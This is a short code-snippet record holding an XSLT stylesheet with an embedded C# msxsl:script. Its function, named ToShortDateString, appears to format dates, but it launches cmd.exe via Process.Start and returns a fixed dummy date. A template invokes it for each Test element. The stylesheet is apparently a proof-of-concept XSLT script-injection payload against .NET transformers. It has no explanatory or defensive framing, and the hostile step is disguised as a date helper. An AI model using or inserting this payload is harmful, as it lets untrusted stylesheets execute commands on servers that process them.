---
id: 12aa679c-9079-4e91-9a3a-bc37164bb36b
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:41.608263+00:00'
updated_at: '2023-04-10T20:24:50.004718+00:00'
---

# Code Snippet 12aa679c

**Language**: xml

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
  </xsl:stylesheet>
```


